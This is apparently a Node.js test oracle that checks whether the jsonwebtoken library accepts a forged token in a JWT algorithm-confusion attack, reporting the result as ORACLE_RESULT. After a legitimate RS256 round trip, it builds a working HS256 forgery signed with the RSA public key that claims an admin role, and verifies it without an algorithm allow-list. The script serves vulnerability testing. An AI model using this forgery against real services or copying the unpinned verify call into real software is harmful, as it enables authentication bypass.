'use strict';
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let jwt;
try {
  jwt = require('jsonwebtoken');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'jwt-rs-hs-confusion-oracle-' + process.pid + '-' + Date.now();
let tmpDir;
try {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), marker + '-'));
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'tmp setup failed: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Generate an RSA keypair to simulate a server using RS256 asymmetric signing.
  let publicKey, privateKey;
  try {
    const keys = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });
    publicKey = keys.publicKey;
    privateKey = keys.privateKey;
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'rsa keypair generation failed: ' + String(e && e.message) });
    process.exit(0);
  }

  // --- Benign operation: legitimate RS256 sign + verify round trip using the keypair. ---
  const benignPayload = { sub: 'user123', role: 'guest', marker };
  let benignToken;
  try {
    benignToken = jwt.sign(benignPayload, privateKey, { algorithm: 'RS256', expiresIn: '5m' });
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign sign failed unexpectedly: ' + String(e && e.message) });
    process.exit(0);
  }

  let benignDecoded;
  try {
    benignDecoded = jwt.verify(benignToken, publicKey);
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign verify failed unexpectedly: ' + String(e && e.message) });
    process.exit(0);
  }

  if (!benignDecoded || benignDecoded.sub !== 'user123' || benignDecoded.marker !== marker) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign verify returned unexpected payload' });
    process.exit(0);
  }

  const fixturePath = path.join(tmpDir, 'benign-token.txt');
  fs.writeFileSync(fixturePath, benignToken);

  operation_completed = true;

  // --- Malicious operation: algorithm-confusion attack. ---
  // The attacker does not know the RSA private key, but knows the server's
  // public key (which is, by design, public). The attacker forges a token
  // with header alg:'HS256' and signs it using HMAC-SHA256 with the public
  // key PEM string as the shared secret. If the verifying server calls
  // jwt.verify(token, publicKey) WITHOUT restricting algorithms, the HS256
  // signature check will succeed because jsonwebtoken/jws will happily use
  // whatever algorithm is specified in the (attacker-controlled) header.
  function base64url(buf) {
    return Buffer.from(buf).toString('base64')
      .replace(/=+$/, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');
  }

  const forgedHeader = { alg: 'HS256', typ: 'JWT' };
  const forgedPayload = { sub: 'attacker', role: 'admin', marker: marker + '-forged' };
  const headerSeg = base64url(JSON.stringify(forgedHeader));
  const payloadSeg = base64url(JSON.stringify(forgedPayload));
  const signingInput = headerSeg + '.' + payloadSeg;

  const hmac = crypto.createHmac('sha256', publicKey);
  hmac.update(signingInput);
  const forgedSig = hmac.digest('base64')
    .replace(/=+$/, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');

  const forgedToken = signingInput + '.' + forgedSig;

  let forgedDecoded = null;
  let verifyThrew = false;
  let verifyError = null;
  try {
    // Server-side verification call as it would typically be written when
    // trusting the key material alone and not pinning algorithms explicitly.
    forgedDecoded = jwt.verify(forgedToken, publicKey);
  } catch (e) {
    verifyThrew = true;
    verifyError = e;
  }

  if (verifyThrew) {
    exploit_succeeded = false;
    evidence = 'forged HS256-via-public-key token was rejected by jwt.verify (blocked): ' + String(verifyError && verifyError.message);
  } else if (forgedDecoded && forgedDecoded.role === 'admin' && forgedDecoded.marker === marker + '-forged') {
    exploit_succeeded = true;
    evidence = 'jwt.verify accepted an HS256-forged token signed with the RSA public key as HMAC secret, without an algorithms allow-list; decoded payload: ' + JSON.stringify(forgedDecoded);
  } else {
    exploit_succeeded = false;
    evidence = 'forged token verify did not return expected forged admin payload: ' + JSON.stringify(forgedDecoded);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected exception: ' + String(e && e.stack || e) });
} finally {
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch (_) { /* ignore cleanup errors */ }
}
